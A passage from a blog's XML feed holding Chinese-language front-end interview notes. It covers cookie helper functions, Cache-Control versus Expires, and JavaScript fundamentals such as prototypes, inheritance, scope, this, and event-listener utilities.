class="name">script</span>&gt;</span><span class="javascript"> </span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">whatBrowser</span>(<span class="params"></span>) </span>&#123;  </div><div class="line">    <span class="built_in">document</span>.Browser.Name.value=navigator.appName;  </div><div class="line">    <span class="built_in">document</span>.Browser.Version.value=navigator.appVersion;  </div><div class="line">    <span class="built_in">document</span>.Browser.Code.value=navigator.appCodeName;  </div><div class="line">    <span class="built_in">document</span>.Browser.Agent.value=navigator.userAgent;  </div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure><blockquote><p>js 数组去重</p></blockquote><p>用JavaScript脚本为Array对象添加一个去除重复项的方法</p><blockquote><p>cache-control</p></blockquote><p>网页的缓存是由HTTP消息头中的“Cache-control”来控制的，常见的取值有private、no-cache、max-age、must-revalidate等，默认为private。</p><p>Expires 头部字段提供一个日期和时间，响应在该日期和时间后被认为失效。允许客户端在这个时间之前不去检查（发请求），等同max-age的效果。但是如果同时存在，则被Cache-Control的max-age覆盖。</p><p>Expires = “Expires” “:” HTTP-date<br>例如：<br>Expires: Thu, 01 Dec 1994 16:00:00 GMT （必须是GMT格式）<br>如果把它设置为-1，则表示立即过期</p><p>Expires 和 max-age 都可以用来指定文档的过期时间，但是二者有一些细微差别<br>1)  Expires在HTTP/1.0中已经定义，Cache-Control:max-age在HTTP/1.1中才有定义，为了向下兼容，仅使用max-age不够<br>2)  Expires指定一个绝对的过期时间(GMT格式),这么做会导致至少2个问题：<br>    2.1客户端和服务器时间不同步导致Expires的配置出现问题。<br>    2.2很容易在配置后忘记具体的过期时间，导致过期来临出现浪涌现象<br>3)  max-age 指定的是从文档被访问后的存活时间，这个时间是个相对值(比如:3600s)，相对的是文档第一次被请求时服务器记录的Request_time(请求时间)<br>4)  Expires 指定的时间可以是相对文件的最后访问时间(Atime)或者修改时间(MTime)，而max-age相对对的是文档的请求时间(Atime)<br>5)  如果值为 no-cache,那么每次都会访问服务器。如果值为max-age，则在过期之前不会重复访问服务器。</p><blockquote><p>js 操作获取和设置 cookie</p></blockquote><p>// 创建cookie<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieText = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(value);</div><div class="line">    <span class="keyword">if</span> (expires <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</div><div class="line">        cookieText += <span class="string">'; expires='</span> + expires;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (path) &#123;</div><div class="line">        cookieText += <span class="string">"; path="</span> + path     &#125;</div><div class="line">    <span class="keyword">if</span> (domain) &#123;</div><div class="line">        cookieText += <span class="string">'; domain='</span> + domain;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (secure) &#123;</div><div class="line">        cookieText += <span class="string">'; secure'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">document</span>.cookie = cookieText;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>// 获取cookie<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieName = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>;</div><div class="line">    <span class="keyword">var</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</div><div class="line">    <span class="keyword">var</span> cookieValue = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</div><div class="line">        <span class="keyword">if</span> (cookieEnd == <span class="number">-1</span>) &#123;</div><div class="line">            cookieEnd = <span class="built_in">document</span>.cookie.length;</div><div class="line">        &#125;</div><div class="line">        cookieValue = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cookieValue;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 删除cookie</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">unsetCookie</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">"= ; expires="</span> + <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><a href="https://www.nowcoder.com/ta/front-end-interview" target="_blank" rel="external">【牛客链接】</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;请你谈谈Cookie的弊端&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;优点&lt;/strong&gt;： 极高的扩展性和可用性&lt;br&gt;1) 数据持久性。&lt;br&gt;2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。&lt;br&gt;3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。&lt;br&gt;4) 简单性。 基于文本的轻量结构。&lt;br&gt;5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。&lt;br&gt;6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。&lt;br&gt;7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Javascript 查漏补缺</title>
    <link href="wangsiyuan233.github.io/2018/07/11/59Javascript-%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/"/>
    <id>wangsiyuan233.github.io/2018/07/11/59Javascript-查漏补缺/</id>
    <published>2018-07-11T14:09:37.000Z</published>
    <updated>2018-07-16T17:09:24.180Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>（方方-必考）一、介绍js的基本数据类型。</p></blockquote><p><code>Undefined、Null、Boolean、Number、String、</code><br>ECMAScript 2015 新增:<code>Symbol</code> (创建后独一无二且不可变的数据类型 )<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p><blockquote><p>二、介绍js有哪些内置对象？</p></blockquote><p>Object 是 JavaScript 中所有对象的父对象</p><p>数据封装类对象：<code>Object、Array、Boolean、Number 和 String</code><br>其他对象：<code>Function、Arguments、Math、Date、RegExp、Error</code><br><a href="https://www.ibm.com/developerworks/cn/web/wa-objectsinjs-v1b/index.html" target="_blank" rel="external">了解 JavaScript 中的内置对象</a><br><a id="more"></a></p><blockquote><p>三、说几条写JavaScript的基本规范？</p></blockquote><p>（1）、不要在同一行声明多个变量。<br>（2）、请使用 ===/!==来比较true/false或者数值<br>（3）、使用对象字面量替代new Array这种形式<br>（4）、不要使用全局函数。<br>（5）、Switch语句必须带有default分支<br>（6）、函数不应该有时候有返回值，有时候没有返回值。<br>（7）、For循环必须使用大括号<br>（8）、If语句必须使用大括号<br>（9）、for-in 循环中的变量 应该使用 var关键字明确限定作用域，从而避免作用域污染。</p><blockquote><p>四、JavaScript原型，原型链 ? 有什么特点？</p></blockquote><p>每个对象都会在其内部初始化一个属性，就是prototype(原型)，当我们访问一个对象的属性时，<br>如果这个对象内部不存在这个属性，那么他就会去prototype里找这个属性，这个prototype又会有自己的prototype，<br>于是就这样一直找下去，也就是我们平时所说的原型链的概念。<br>关系：instance.constructor.prototype = instance.<strong>proto</strong></p><p>特点：JavaScript对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变。</p><p>当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，<br>就会查找他的Prototype对象是否有这个属性，如此递推下去，一直检索到 Object 内建对象。<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function <span class="function"><span class="keyword">Func</span><span class="params">()</span>&#123;&#125;</span></div><div class="line"><span class="function"><span class="keyword">Func</span>.<span class="title">prototype</span>.<span class="title">name</span> = "<span class="title">Sean</span>";</span></div><div class="line"><span class="function"><span class="keyword">Func</span>.<span class="title">prototype</span>.<span class="title">getInfo</span> = <span class="title">function</span><span class="params">()</span> &#123;</span></div><div class="line">  <span class="keyword">return</span> this.name<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">var person = new <span class="function"><span class="keyword">Func</span><span class="params">()</span>;//现在可以参考<span class="title">var</span> <span class="title">person</span> = <span class="title">Object</span>.<span class="title">create</span><span class="params">(oldObject)</span>;</span></div><div class="line">console.<span class="built_in">log</span>(person.getInfo())<span class="comment">;//它拥有了Func的属性和方法</span></div><div class="line">//<span class="string">"Sean"</span></div><div class="line">console.<span class="built_in">log</span>(<span class="function"><span class="keyword">Func</span>.<span class="title">prototype</span>);</span></div><div class="line">// <span class="function"><span class="keyword">Func</span> &#123; <span class="title">name</span>="<span class="title">Sean</span>", <span class="title">getInfo</span>=<span class="title">function</span><span class="params">()</span>&#125;</span></div></pre></td></tr></table></figure></p><blockquote><p>五、JavaScript有几种类型的值？，你能画一下他们的内存图吗？</p></blockquote><p>栈：原始数据类型（Undefined，Null，Boolean，Number、String）<br>堆：引用数据类型（对象、数组和函数）</p><p>两种类型的区别是：存储位置不同；<br>原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储；<br>引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体<br><img src="https://i.imgur.com/pJTweI7.gif" alt=""></p><blockquote><p>六、如何将字符串转化为数字，例如’12.3b’?</p></blockquote><p>（1）、<code>parseFloat(&#39;12.3b&#39;)</code>;<br>（2）、正则表达式，<code>&#39;12.3b&#39;.match(/(\d)+(\.)?(\d)+/g)[0] * 1</code>, 但是这个不太靠谱，提供一种思路而已。</p><blockquote><p>七、如何将浮点数点左边的数每三位添加一个逗号，如12000000.11转化为『12,000,000.11』?</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">commafy</span>(<span class="params">num</span>)</span>&#123;</div><div class="line"><span class="keyword">return</span> num &amp;&amp; num</div><div class="line">.toString()</div><div class="line">.replace(<span class="regexp">/(\d)(?=(\d&#123;3&#125;)+\.)/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$<span class="number">1</span>, $<span class="number">2</span></span>)</span>&#123;</div><div class="line"><span class="keyword">return</span> $<span class="number">2</span> + <span class="string">','</span>;</div><div class="line">&#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>八、如何实现数组的随机排序？</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//方法一：</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</div><div class="line">function randSort1(arr)&#123;</div><div class="line">for(var i = <span class="number">0</span>,len = arr.length;i &lt; len; i++ )&#123;</div><div class="line">var rand = parseInt(Math.random()*len);</div><div class="line">var temp = arr[rand];</div><div class="line">arr[rand] = arr[i];</div><div class="line">arr[i] = temp;</div><div class="line">&#125;</div><div class="line">return arr;</div><div class="line">&#125;</div><div class="line">console.log(randSort1(arr));</div><div class="line"></div><div class="line"><span class="comment">//方法二：</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</div><div class="line">function randSort2(arr)&#123;</div><div class="line">var mixedArray = [];</div><div class="line">while(arr.length &gt; <span class="number">0</span>)&#123;</div><div class="line">var randomIndex = parseInt(Math.random()*arr.length);</div><div class="line">mixedArray.push(arr[randomIndex]);</div><div class="line">arr.splice(randomIndex, <span class="number">1</span>);</div><div class="line">&#125;</div><div class="line">return mixedArray;</div><div class="line">&#125;</div><div class="line">console.log(randSort2(arr));</div><div class="line"></div><div class="line"><span class="comment">//方法三：</span></div><div class="line">var arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</div><div class="line">arr.sort(function()&#123;</div><div class="line">return Math.random() - <span class="number">0.5</span>;</div><div class="line">&#125;)</div><div class="line">console.log(arr);</div></pre></td></tr></table></figure><blockquote><p>九、Javascript如何实现继承？</p></blockquote><p>（1）、构造继承<br>（2）、原型继承<br>（3）、实例继承<br>（4）、拷贝继承</p><p> 原型prototype机制或apply和call方法去实现较简单，建议使用构造函数与原型混合方式。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params"></span>)</span>&#123;</div><div class="line"><span class="keyword">this</span>.name = <span class="string">'wang'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params"></span>)</span>&#123;</div><div class="line"><span class="keyword">this</span>.age = <span class="number">28</span>;</div><div class="line">&#125;</div><div class="line">Child.prototype = <span class="keyword">new</span> Parent();<span class="comment">//继承了Parent，通过原型</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> demo = <span class="keyword">new</span> Child();</div><div class="line">alert(demo.age);</div><div class="line">alert(demo.name);<span class="comment">//得到被继承的属性</span></div></pre></td></tr></table></figure></p><blockquote><p>十、JavaScript继承的几种实现方式？</p></blockquote><p>（1）、<a href="http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance.html" target="_blank" rel="external">构造函数的继承</a><br>（2）、<a href="http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance_continued.html" target="_blank" rel="external">非构造函数的继承</a></p><blockquote><p>十一、javascript创建对象的几种方式？</p></blockquote><p>javascript创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用JSON；但写法有很多种，也能混合使用。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">（<span class="number">1</span>）、对象字面量的方式</div><div class="line"></div><div class="line"> person=&#123;<span class="attr">firstname</span>:<span class="string">"Mark"</span>,<span class="attr">lastname</span>:<span class="string">"Yun"</span>,<span class="attr">age</span>:<span class="number">25</span>,<span class="attr">eyecolor</span>:<span class="string">"black"</span>&#125;;</div><div class="line"></div><div class="line">（<span class="number">2</span>）、用<span class="function"><span class="keyword">function</span>来模拟无参的构造函数</span></div><div class="line"></div><div class="line"> <span class="title">function</span> <span class="title">Person</span>(<span class="params"></span>)&#123;&#125;</div><div class="line"> <span class="keyword">var</span> person=<span class="keyword">new</span> Person();<span class="comment">//定义一个function，如果使用new"实例化",该function可以看作是一个Class</span></div><div class="line"> person.name=<span class="string">"Mark"</span>;</div><div class="line"> person.age=<span class="string">"25"</span>;</div><div class="line"> person.work=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> alert(person.name+<span class="string">" hello..."</span>);</div><div class="line"> &#125;</div><div class="line"> person.work();</div><div class="line"></div><div class="line">（<span class="number">3</span>）、用<span class="function"><span class="keyword">function</span>来模拟参构造函数来实现（用<span class="title">this</span>关键字定义构造的上下文属性）</span></div><div class="line"></div><div class="line"> <span class="title">function</span> <span class="title">Pet</span>(<span class="params">name,age,hobby</span>)&#123;</div><div class="line">    <span class="keyword">this</span>.name=name;<span class="comment">//this作用域：当前对象</span></div><div class="line">    <span class="keyword">this</span>.age=age;</div><div class="line">    <span class="keyword">this</span>.hobby=hobby;</div><div class="line">    <span class="keyword">this</span>.eat=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">       alert(<span class="string">"我叫"</span>+<span class="keyword">this</span>.name+<span class="string">",我喜欢"</span>+<span class="keyword">this</span>.hobby+<span class="string">",是个程序员"</span>);</div><div class="line">    &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">var</span> maidou =<span class="keyword">new</span> Pet(<span class="string">"麦兜"</span>,<span class="number">25</span>,<span class="string">"coding"</span>);<span class="comment">//实例化、创建对象</span></div><div class="line"> maidou.eat();<span class="comment">//调用eat方法</span></div><div class="line"></div><div class="line"></div><div class="line">（<span class="number">4</span>）、用工厂方式来创建（内置对象）</div><div class="line"></div><div class="line">  <span class="keyword">var</span> wcDog =<span class="keyword">new</span> <span class="built_in">Object</span>();</div><div class="line">  wcDog.name=<span class="string">"旺财"</span>;</div><div class="line">  wcDog.age=<span class="number">3</span>;</div><div class="line">  wcDog.work=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    alert(<span class="string">"我是"</span>+wcDog.name+<span class="string">",汪汪汪......"</span>);</div><div class="line">  &#125;</div><div class="line">  wcDog.work();</div><div class="line"></div><div class="line"></div><div class="line">（<span class="number">5</span>）、用原型方式来创建</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">  &#125;</div><div class="line">  Dog.prototype.name=<span class="string">"旺财"</span>;</div><div class="line">  Dog.prototype.eat=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  alert(<span class="keyword">this</span>.name+<span class="string">"是个吃货"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> wangcai =<span class="keyword">new</span> Dog();</div><div class="line">  wangcai.eat();</div><div class="line"></div><div class="line"></div><div class="line">（<span class="number">6</span>）、用混合方式来创建</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params">name,price</span>)</span>&#123;</div><div class="line">   <span class="keyword">this</span>.name=name;</div><div class="line">   <span class="keyword">this</span>.price=price;</div><div class="line"> &#125;</div><div class="line">  Car.prototype.sell=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    alert(<span class="string">"我是"</span>+<span class="keyword">this</span>.name+<span class="string">"，我现在卖"</span>+<span class="keyword">this</span>.price+<span class="string">"万元"</span>);</div><div class="line">   &#125;</div><div class="line"> <span class="keyword">var</span> camry =<span class="keyword">new</span> Car(<span class="string">"凯美瑞"</span>,<span class="number">27</span>);</div><div class="line"> camry.sell();</div></pre></td></tr></table></figure></p><blockquote><p>十二、Javascript作用链域?</p></blockquote><p>全局函数无法查看局部函数的内部细节，但局部函数可以查看其上层的函数细节，直至全局细节。当需要从局部函数查找某一属性或方法时，如果当前作用域没有找到，就会上溯到上层作用域查找，直至全局函数，这种组织形式就是作用域链。</p><blockquote><p>十三、谈谈This对象的理解。</p></blockquote><p><code>this</code> 总是指向函数的直接调用者（而非间接调用者）；<br>如果有new关键字，<code>this</code> 指向 new 出来的那个对象；<br>在事件中，<code>this</code> 指向触发这个事件的对象，特殊的是，IE中的attachEvent中的<code>this</code> 总是指向全局对象Window；</p><blockquote><p>十三、eval是做什么的？</p></blockquote><p>它的功能是把对应的字符串解析成JS代码并运行；<br>应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）。<br>由JSON字符串转换为JSON对象的时候可以用eval，<code>var obj =eval(&#39;(&#39;+ str +&#39;)&#39;);</code></p><blockquote><p>十四、什么是window对象? 什么是document对象?</p></blockquote><p>window对象是指浏览器打开的窗口。<br>document对象是Documentd对象（HTML 文档对象）的一个只读引用，window对象的一个属性。</p><blockquote><p>十五、null，undefined 的区别？</p></blockquote><p><a href="http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html" target="_blank" rel="external">阮一峰：undefined与null的区别</a></p><blockquote><p>十六、写一个通用的事件侦听器函数。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// event(事件)工具集，来源：github.com/markyun</span></div><div class="line">markyun.Event = &#123;</div><div class="line"><span class="comment">// 页面加载完成后</span></div><div class="line">readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</div><div class="line">fn=<span class="built_in">document</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line"><span class="built_in">window</span>.onload = fn;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">oldonload();</div><div class="line">fn();</div><div class="line">&#125;;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></div><div class="line"><span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></div><div class="line">addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line"><span class="comment">//事件类型、需要执行的函数、是否捕捉</span></div><div class="line">element.addEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">handler.call(element);</div><div class="line">&#125;);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = handler;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 移除事件</span></div><div class="line">removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.removeEventListener) &#123;</div><div class="line">element.removeEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</div><div class="line">element.detachEvent(<span class="string">'on'</span> + type, handler);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></div><div class="line">stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (ev.stopPropagation) &#123;</div><div class="line">ev.stopPropagation();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">ev.cancelBubble = <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 取消事件的默认行为</span></div><div class="line">preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">event.preventDefault();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">event.returnValue = <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取事件目标</span></div><div class="line">getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></div><div class="line">getEvent : <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</div><div class="line"><span class="keyword">if</span> (!ev) &#123;</div><div class="line"><span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</div><div class="line"><span class="keyword">while</span> (c) &#123;</div><div class="line">ev = c.arguments[<span class="number">0</span>];</div><div class="line"><span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">c = c.caller;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ev;</div><div class="line">&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><blockquote><p>十七、[“1”, “2”, “3”].map(parseInt) 答案是多少？</p></blockquote><p>parseInt()只接受两个参数，第一个参数是数字，第二个是进制<br>这里有三个参数传进来，parseInt 就混乱了<br>结果是：[1, NaN, NaN]</p><blockquote><p>十八、事件是？IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</p></blockquote><p>（1）、我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 